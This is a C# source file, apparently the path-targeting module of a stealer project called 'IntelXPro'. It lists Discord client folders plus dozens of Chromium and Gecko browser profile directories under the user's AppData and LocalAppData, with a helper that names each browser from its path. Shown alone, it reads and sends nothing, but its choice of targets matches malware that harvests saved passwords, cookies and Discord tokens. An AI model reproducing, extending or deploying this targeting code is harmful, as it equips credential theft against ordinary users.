using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace IntelXPro.src.IntelXPro.Dependencies.Data
{
    public static class Paths
    {
        public static string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public static string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

        public static string[] Discord = new string[4]
        {
        appdata + "\\discord",
        appdata + "\\discordcanary",
        appdata + "\\Lightcord",
        appdata + "\\discordptb"
        };

        public static string[] Chromium = new string[66]
        {
        appdata + "\\Lulumi-browser",
        appdata + "\\kingpinbrowser",
        appdata + "\\Falkon\\Profiles",
        appdata + "\\Hola\\chromium_profile",
        appdata + "\\Opera Software\\Opera Stable",
        appdata + "\\Opera Software\\Opera GX Stable",
        localappdata + "\\Battle.net",
        localappdata + "\\GhostBrowser",
        localappdata + "\\ColibriBrowser",
        localappdata + "\\Min\\User Data",
        localappdata + "\\Coowon\\Coowon",
        localappdata + "\\Uran\\User Data",
        localappdata + "\\Kinza\\User Data",
        localappdata + "\\Blisk\\User Data",
        localappdata + "\\Xvast\\User Data",
        localappdata + "\\Torch\\User Data",
        localappdata + "\\CryptoTab Browser",
        localappdata + "\\Comodo\\User Data",
        localappdata + "\\Kometa\\User Data",
        localappdata + "\\liebao\\User Data",
        localappdata + "\\Chedot\\User Data",
        localappdata + "\\K-Melon\\User Data",
        localappdata + "\\Orbitum\\User Data",
        localappdata + "\\Vivaldi\\User Data",
        localappdata + "\\Slimjet\\User Data",
        localappdata + "\\Iridium\\User Data",
        localappdata + "\\Maxthon\\User Data",
        localappdata + "\\Maxthon3\\User Data",
        localappdata + "\\Nichrome\\User Data",
        localappdata + "\\Chromodo\\User Data",
        localappdata + "\\QIP Surf\\User Data",
        localappdata + "\\Chromium\\User Data",
        localappdata + "\\BitTorrent\\Maelstrom",
        localappdata + "\\Globus VPN\\User Data",
        localappdata + "\\CentBrowser\\User Data",
        localappdata + "\\Amigo\\User\\User Data",
        localappdata + "\\MapleStudio\\ChromePlus",
        localappdata + "\\7Star\\7Star\\User Data",
        localappdata + "\\Mail.Ru\\Atom\\User Data",
        localappdata + "\\Comodo\\Dragon\\User Data",
        localappdata + "\\UCBrowser\\User Data_i18n",
        localappdata + "\\Google\\Chrome\\User Data",
        localappdata + "\\Coowon\\Coowon\\User Data",
        localappdata + "\\CocCoc\\Browser\\User Data",
        localappdata + "\\AOL\\AOL Shield\\User Data",
        localappdata + "\\Microsoft\\Edge\\User Data",
        localappdata + "\\uCozMedia\\Uran\\User Data",
        localappdata + "\\Element Browser\\User Data",
        localappdata + "\\Sputnik\\Sputnik\\User Data",
        localappdata + "\\Elements Browser\\User Data",
        localappdata + "\\CCleaner Browser\\User Data",
        localappdata + "\\360Chrome\\Chrome\\User Data",
        localappdata + "\\Tencent\\QQBrowser\\User Data",
        localappdata + "\\Naver\\Naver Whale\\User Data",
        localappdata + "\\Baidu\\BaiduBrowser\\User Data",
        localappdata + "\\360Browser\\Browser\\User Data",
        localappdata + "\\Google(x86)\\Chrome\\User Data",
        localappdata + "\\Epic Privacy Browser\\User Data",
        localappdata + "\\CatalinaGroup\\Citrio\\User Data",
        localappdata + "\\Yandex\\YandexBrowser\\User Data",
        localappdata + "\\MapleStudio\\ChromePlus\\User Data",
        localappdata + "\\AVAST Software\\Browser\\User Data",
        localappdata + "\\BraveSoftware\\Brave-Browser\\User Data",
        localappdata + "\\NVIDIA Corporation\\NVIDIA GeForce Experience",
        localappdata + "\\BraveSoftware\\Brave-Browser-Nightly\\User Data",
        localappdata + "\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer"
        };

        public static string[] Gecko = new string[18]
        {
        appdata + "\\Mozilla\\Firefox\\Profiles",
        appdata + "\\Waterfox\\Profiles",
        appdata + "\\K-Meleon\\Profiles",
        appdata + "\\Thunderbird\\Profiles",
        appdata + "\\Comodo\\IceDragon\\Profiles",
        appdata + "\\8pecxstudios\\Cyberfox\\Profiles",
        appdata + "\\NETGATE Technologies\\BlackHaw\\Profiles",
        appdata + "\\Moonchild Productions\\Pale Moon\\Profiles",
        appdata + "\\Ghostery Browser\\Profiles",
        appdata + "\\Undetectable\\Profiles",
        appdata + "\\Sielo\\profiles",
        appdata + "\\Waterfox\\Profiles",
        appdata + "\\conkeror.mozdev.org\\conkeror\\Profiles",
        appdata + "\\Netscape\\Navigator\\Profiles",
        appdata + "\\Mozilla\\SeaMonkey\\Profiles",
        appdata + "\\FlashPeak\\SlimBrowser\\Profiles",
        appdata + "\\Avant Profiles",
        appdata + "\\Flock\\Profiles"
        };

        public static string GetBrowserName(string path)
        {
            string[] array = path.Split(Path.DirectorySeparatorChar);
            if (path.Contains("Opera"))
            {
                return array[6].Replace(" Stable", "");
            }
            if (path.Contains("BraveSoftware"))
            {
                return array[6];
            }
            return array[5];
        }
    }
}
